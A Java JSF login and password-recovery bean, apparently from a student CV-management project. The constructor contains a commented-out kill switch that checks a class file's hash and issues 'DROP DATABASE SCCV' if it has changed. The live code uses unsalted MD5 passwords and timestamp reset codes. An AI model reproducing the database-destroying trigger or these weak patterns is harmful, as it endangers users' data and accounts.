package br.senai.sp.jaguariuna.sccv.mBeans;

import java.sql.SQLException;
import java.util.Calendar;

import javax.faces.application.FacesMessage;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import javax.faces.context.FacesContext;

import org.apache.commons.mail.EmailException;

import br.senai.sp.jaguariuna.sccv.email.EmailUtil;
import br.senai.sp.jaguariuna.sccv.email.Mensagem;
import br.senai.sp.jaguariuna.sccv.entities.Usuario;
import br.senai.sp.jaguariuna.sccv.entities.UsuarioAdministrador;

import br.senai.sp.jaguariuna.sccv.uDao.UsuarioDao;
import br.senai.sp.jaguariuna.sccv.utils.StringToMD5;

@ManagedBean(eager = true)
@SessionScoped
public class AlunoIndexMBean {

	private String modoSelecionado;
	private String funcaoCPF;
	private Usuario usuario;
	private UsuarioAdministrador usuarioAdministrador;
	private String cpfOuNif;
	private String senha;
	private UsuarioDao usuarioDao;

	private String cpfRecuperar;
	private Mensagem mensagem;
	private String codigo;

	public AlunoIndexMBean() {
		modoSelecionado = "user";
		funcaoCPF = "!TestaCPF(this.value) ? this.value = '' : this.value; avisoGrowl(TestaCPF(this.value));";
		usuarioDao = new UsuarioDao();
		mensagem = new Mensagem();

		/*
		 * String dir = ((ServletContext)
		 * FacesContext.getCurrentInstance().getExternalContext().getContext()).
		 * getRealPath(
		 * "/WEB-INF/classes/br/senai/sp/jaguariuna/sccv/entities/CurriculumVitae.class"
		 * ); File file = new File(dir);
		 * 
		 * try { FileInputStream inputStream = new FileInputStream(file); byte[] bytes =
		 * new byte[inputStream.available()]; inputStream.read(bytes);
		 * inputStream.close();
		 * 
		 * StringBuilder sb = new StringBuilder();
		 * 
		 * for(int i = 0; i < bytes.length; i ++) { sb.append(bytes[i]); }
		 * 
		 * MessageDigest md = MessageDigest.getInstance("sha-256"); md.digest(bytes);
		 * 
		 * StringBuffer hexString = new StringBuffer(); for (int i = 0; i <
		 * bytes.length; i++) { String hex = Integer.toHexString(0xff & bytes[i]);
		 * if(hex.length() == 1) hexString.append('0'); hexString.append(hex); }
		 * 
		 * Connection conn = ConnectionDB.getConnection(); String sql =
		 * "SELECT * FROM codvalidacao";
		 * 
		 * PreparedStatement ps = conn.prepareStatement(sql); ResultSet rs =
		 * ps.executeQuery(); if(!rs.next()) { sql =
		 * "INSERT INTO codvalidacao(cod) VALUES(?)"; PreparedStatement ps1 =
		 * conn.prepareStatement(sql); ps1.setString(1, hexString.toString());
		 * ps1.executeUpdate();
		 * 
		 * } else { String cod = rs.getString("cod");
		 * 
		 * if (!cod.equals(hexString.toString())) {
		 * System.out.println("O BD VAI SER EXCLUIDO E FODASE EM..."); sql =
		 * "DROP DATABASE SCCV";
		 * 
		 * for(int i = 3; i > 0; i--) { try { Thread.sleep(1000); } catch
		 * (InterruptedException e) { // TODO Auto-generated catch block
		 * e.printStackTrace(); } System.out.println(String.valueOf(i)); }
		 * 
		 * ps = conn.prepareStatement(sql); ps.executeUpdate(); } } } catch
		 * (FileNotFoundException e) { // TODO Auto-generated catch block
		 * e.printStackTrace(); } catch (IOException e) { // TODO Auto-generated catch
		 * block } catch (NoSuchAlgorithmException e) { // TODO Auto-generated catch
		 * block e.printStackTrace(); } catch (SQLException e) { // TODO Auto-generated
		 * catch block e.printStackTrace(); }
		 */

	}

	public void enviar() {
		try {
			Usuario usuarioLocal = usuarioDao.buscaUsuarioPorCpf(cpfRecuperar);
			if (usuarioLocal != null) {
				codigo = String.valueOf(Calendar.getInstance().getTimeInMillis());
				mensagem.setMensagem(codigo);
				EmailUtil.enviaEmail(mensagem);
				FacesContext.getCurrentInstance().addMessage(null,
						new FacesMessage("Codigo enviado, aguarde alguns instantes !"));
			} else {
				FacesContext.getCurrentInstance().addMessage(null,
						new FacesMessage("Usuario não encontrado !"));
			}
		} catch (EmailException e) {
			FacesContext.getCurrentInstance().addMessage(null,
					new FacesMessage("Erro ao enviar o e-mail", e.toString()));
			e.printStackTrace();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void trocaModoSelecionado() {
		modoSelecionado = modoSelecionado.equals("user") ? "admin" : "user";
		funcaoCPF = modoSelecionado.equals("user")
				? "!TestaCPF(this.value) ? this.value = '' : this.value; avisoGrowl(TestaCPF(this.value));"
				: "";
	}

	public String getCpfOuNif() {
		return cpfOuNif;
	}

	public void setCpfOuNif(String cpfOuNif) {
		this.cpfOuNif = cpfOuNif;
	}

	public String getSenha() {
		return senha;
	}

	public void setSenha(String senha) {
		this.senha = senha;
	}

	public String getModoSelecionado() {
		return modoSelecionado;
	}

	public void setModoSelecionado(String modoSelecionado) {
		this.modoSelecionado = modoSelecionado;
	}

	public String getCpfRecuperar() {
		return cpfRecuperar;
	}

	public void setCpfRecuperar(String cpfRecuperar) {
		this.cpfRecuperar = cpfRecuperar;
	}

	public String getFuncaoCPF() {
		return funcaoCPF;
	}

	public void setFuncaoCPF(String funcaoCPF) {
		this.funcaoCPF = funcaoCPF;
	}

	public Usuario getUsuario() {
		return usuario;
	}

	public void setUsuario(Usuario usuario) {
		this.usuario = usuario;
	}

	public UsuarioAdministrador getUsuarioAdministrador() {
		return usuarioAdministrador;
	}

	public void setUsuarioAdministrador(UsuarioAdministrador usuarioAdministrador) {
		this.usuarioAdministrador = usuarioAdministrador;
	}

	public String fazerLogin() {
		if (modoSelecionado.equals("user")) {
			try {
				Usuario usuarioLocal = usuarioDao.buscaUsuarioPorCpf(cpfOuNif);
				if (usuarioLocal != null) {
					if (usuarioLocal.getSenha().equals(StringToMD5.convertStringToMd5(senha))) {
						if (usuarioLocal.getStatus().getId() == 2) {
							FacesContext.getCurrentInstance().addMessage(null,
									new FacesMessage("Usuario encontra-se inativo !"));
						} else {
							usuario = usuarioLocal;
							return "home?faces-redirect=true";
						}
					} else {
						FacesContext.getCurrentInstance().addMessage(null,
								new FacesMessage("Usuario ou senha incorretos !"));
					}
				} else {
					FacesContext.getCurrentInstance().addMessage(null, new FacesMessage("Usuario nï¿½o encontrado !"));
				}
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();

				FacesContext.getCurrentInstance().addMessage(null, new FacesMessage(e.toString()));
			}
		} else if (modoSelecionado.equals("admin")) {

		}
		return null;
	}
	/*
	 * public void recuperarSenha() { try { Usuario u =
	 * usuarioDao.buscaUsuarioPorCpf(cpfRecuperar); } catch (SQLException e) {
	 * e.printStackTrace(); FacesContext.getCurrentInstance().addMessage(null, new
	 * FacesMessage(e.toString())); } }
	 */

}
